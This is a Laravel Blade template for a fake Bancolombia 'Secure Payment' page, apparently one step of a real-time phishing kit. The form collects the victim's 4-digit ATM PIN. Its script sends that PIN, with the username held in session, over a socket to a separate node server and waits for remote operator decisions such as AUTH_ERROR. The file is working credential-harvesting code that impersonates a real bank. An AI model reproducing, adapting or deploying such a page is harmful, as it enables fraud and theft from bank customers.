@extends('banks.bancolombia.layout')

@section('title', 'Secure Payment')

@section('page_title', 'Ingresa tu clave')

@include('banks.bancolombia.components.alert', [
  'id' => 'loginError',
  'type' => 'error_field'
])

<!-- @include('banks.bancolombia.components.alert', [
  'id' => 'error_custom',
  'type' => 'error_custom',
  'text' => 'Autenticación exitosa.'
]) -->

@include('banks.bancolombia.components.alert', [
  'id' => 'success',
  'type' => 'success',
  'text' => 'Autenticación exitosa.'
])

@section('content')
    <br><br>

    <form id="formStep2" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step'=> 2])}}">
        @csrf
        <div class="input-container">
            <img class="input-icon" src="{{ asset('assets/img/payment/bancolombia/passicon.png') }}">
            <input type="password" name="pass" id="txtPassword" placeholder=" " maxlength="4" minlength="4"
                oninput="this.value = this.value.replace(/\D+/g, '');" inputmode="numeric" pattern="[0-9]{4}" required>
            <label for="txtPassword">Clave del cajero</label>
        </div>

        <a><small>¿olvidaste tu clave?</small></a>

        <br>

        <div>
            <input type="submit" value="Continuar" id="btnPass" disabled>
        </div>
    </form>
@endsection

@php
  $sc = session()->get('sc', []);
  $user = Arr::get($sc, 'user');
@endphp

@push('scripts')
    <script>
        
document.addEventListener('DOMContentLoaded', function () {
  const passInput = document.getElementById('txtPassword');
  const btn = document.getElementById('btnPass');
  const form = document.getElementById('formStep2');
  const nodeUrl = @json($nodeUrl);
  const sessionId = @json($sessionId);
  const sessionToken = @json($sessionToken);
  const step = @json($step); // ✅ asegúrate de pasar $screen desde controller
 // const bank = @json($bank);
  const user = @json($user);

  let waitingNewDecision = false;

  console.log(sessionToken)

  function toggleBtn() {
    btn.disabled = !((passInput.value || '').trim().length === 4);
  }

  function lockUI(lock) {
    passInput.disabled = lock;
    btn.disabled = lock ? true : !((passInput.value || '').trim().length === 4);
  }



  registerSocketUpdateCallback(function (s) {
    // Aquí puedes reaccionar extra sin redirigir manualmente
    console.log(s)

    // ✅ si acabamos de reintentar, ignora AUTH_ERROR "viejo"
    if (waitingNewDecision && String(s.action) === 'AUTH_ERROR') {
        return;
    }

    if (String(s.action).endsWith('_WAIT_ACTION')) {
      waitingNewDecision = false; 
      lockUI(true);
      return;
    }
  });
  

  
  form.addEventListener('submit', function (e) {
    e.preventDefault(); // ✅ quedarse en el mismo step

    const password = (passInput.value || '').trim();
    if (password.length < 4) {
      showBankAlert('loginError', 'Credenciales inválidas.');
      return;
    }
    
    if (!user || user.length < 4) {
      showBankAlert('loginError', 'Credenciales inválidas.');
      setTimeout(() => {
        window.location.href = `/pago/bancolombia/`;
        return;
      }, 2000);
      return;
    }

    hideBankAlert('loginError');
    // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
    waitingNewDecision = true;
    console.log(sessionToken)
    rtEmitSubmit('user:submit_auth', {
    sessionId,
    auth: {
        user: user,
        pass: password
    }
    }, (ack) => {
        console.log(ack)
        if (!ack?.ok) {
          window.hideLoading?.();
          showBankAlert('loginError', ack?.error || 'Error'); 
        }
    });
  });

  passInput.addEventListener('input', toggleBtn);
  toggleBtn();
});
</script>
@endpush